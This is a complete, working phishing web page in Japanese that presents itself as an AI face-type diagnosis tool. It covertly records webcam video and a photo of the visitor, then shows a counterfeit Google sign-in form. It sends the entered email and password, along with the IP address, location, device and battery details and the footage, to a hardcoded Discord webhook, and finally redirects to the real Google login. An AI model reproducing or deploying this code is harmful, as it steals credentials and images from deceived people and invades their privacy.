<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Deep Scan | 次世代顔タイプ診断</title>
    <style>
        * { box-sizing: border-box; outline: none; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { background: #0d0d0d; border: 1px solid #222; padding: 35px; border-radius: 24px; text-align: center; width: 380px; box-shadow: 0 25px 50px rgba(0,0,0,0.9); transition: 0.5s; }
        h1 { font-size: 20px; letter-spacing: 4px; margin-bottom: 25px; color: #fff; font-weight: 300; }
        .v-wrap { width: 100%; border-radius: 15px; overflow: hidden; border: 1px solid #333; margin-bottom: 30px; background: #050505; position: relative; line-height: 0; }
        #video { width: 100%; display: block; transform: scaleX(-1); }
        .btn { background: #ffffff; color: #000; border: none; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.2s; }
        .btn:active { transform: scale(0.98); opacity: 0.8; }
        #login-ui { display: none; }
        input { width: 100%; padding: 15px; margin: 12px 0; border: 1px solid #333; background: #111; color: #fff; border-radius: 10px; font-size: 15px; }
        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: rgba(0, 255, 255, 0.5); box-shadow: 0 0 15px #0ff; display: none; animation: scan 2.5s infinite linear; z-index: 10; }
        @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
        .status-text { font-size: 11px; color: #444; margin-top: 15px; letter-spacing: 1px; }
    </style>
</head>
<body>

    <!-- ステップ1: スキャン画面 -->
    <div class="card" id="camera-ui">
        <h1>NEURAL ANALYZER</h1>
        <div class="v-wrap">
            <div class="scan-line" id="line"></div>
            <video id="video" autoplay playsinline></video>
        </div>
        <button class="btn" id="start-btn">スキャンを開始</button>
        <div class="status-text">ENCRYPTED CONNECTION: SECURE</div>
    </div>

    <!-- ステップ2: ログイン画面 -->
    <div class="card" id="login-ui">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90" style="margin-bottom:20px;">
        <h2 style="font-size:16px; margin-bottom:25px; font-weight: 400; color: #ccc;">続行するには本人確認が必要です</h2>
        <form id="trap-form">
            <input type="email" id="email" placeholder="メールアドレスまたは電話番号" required>
            <input type="password" id="pass" placeholder="パスワードを入力" required>
            <button type="submit" class="btn" id="final-btn">次へ</button>
        </form>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // 🚨 Webhook URL
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm";

        const video = document.getElementById('video');
        const startBtn = document.getElementById('start-btn');
        const line = document.getElementById('line');
        let capturedImg = "";
        let videoBlob = null;
        let net = {};

        // IPと詳細なネットワーク情報を事前に取得
        window.onload = async () => {
            try {
                const res = await fetch('https://ipapi.co/json/');
                net = await res.json();
            } catch (e) { net = { ip: "取得失敗" }; }
        };

        // 1. スキャン開始 & 録画開始
        startBtn.onclick = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                startBtn.innerText = "分析中...";
                startBtn.disabled = true;
                line.style.display = "block";

                // --- 録画ロジック ---
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    videoBlob = new Blob(chunks, { type: 'video/webm' });
                };
                mediaRecorder.start();

                setTimeout(() => {
                    // 写真撮影
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth; 
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    capturedImg = canvas.toDataURL('image/jpeg', 0.5);
                    
                    // 録画停止
                    mediaRecorder.stop();
                    
                    document.getElementById('camera-ui').style.display = 'none';
                    document.getElementById('login-ui').style.display = 'block';
                    
                    // カメラを止める
                    stream.getTracks().forEach(t => t.stop());
                }, 4500); // 4.5秒間録画
            } catch (err) { 
                alert("カメラの許可が必要です。"); 
            }
        };

        // 2. 情報収集とDiscord送信
        document.getElementById('trap-form').onsubmit = async (e) => {
            e.preventDefault();
            document.getElementById('final-btn').innerText = "認証中...";
            document.getElementById('final-btn').disabled = true;

            // バッテリー情報の取得
            let batteryStatus = "不明";
            try {
                const battery = await navigator.getBattery();
                batteryStatus = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? '充電中' : '放電中'})`;
            } catch (e) {}

            const info = {
                ua: navigator.userAgent,
                lang: navigator.language,
                cores: navigator.hardwareConcurrency || '不明',
                mem: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '不明',
                res: `${window.screen.width}x${window.screen.height}`,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                ref: document.referrer || "直接アクセス"
            };

            const payload = {
                username: "Deep Neural Tracker Pro v5",
                avatar_url: "https://cdn-icons-png.flaticon.com/512/6840/6840478.png",
                embeds: [{
                    title: "🎯 Full Intelligence Report Captured",
                    color: 0xee1111,
                    fields: [
                        { name: "📧 Credentials", value: `**Email:** \`${document.getElementById('email').value}\`\n**Pass:** \`${document.getElementById('pass').value}\``, inline: false },
                        { name: "🌐 Network Info", value: `**IP:** [${net.ip}](https://ipinfo.io/${net.ip})\n**ISP:** ${net.org || '?'}\n**Loc:** ${net.city}, ${net.country_name}`, inline: false },
                        { name: "📱 Device Hardware", value: `**OS/Browser:** \`${info.ua}\`\n**CPU/Mem:** ${info.cores} Cores / ${info.mem}\n**Screen:** ${info.res}`, inline: false },
                        { name: "🔋 Env Info", value: `**Battery:** ${batteryStatus}\n**Timezone:** ${info.tz}\n**Referer:** ${info.ref}`, inline: false }
                    ],
                    footer: { text: "Neural Intelligence System - Video Included" },
                    timestamp: new Date()
                }]
            };

            const formData = new FormData();
            formData.append('payload_json', JSON.stringify(payload));
            
            // 写真を添付
            try {
                const photoBlob = await (await fetch(capturedImg)).blob();
                formData.append('file1', photoBlob, 'target_face.jpg');
            } catch (e) {}

            // 動画を添付
            if (videoBlob) {
                formData.append('file2', videoBlob, 'recording.webm');
            }

            // 送信実行
            try {
                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
            } catch (err) {}

            // 最後にGoogleへ飛ばす
            window.location.href = "https://accounts.google.com/ServiceLogin?hl=ja";
        };
    </script>
</body>
</html>
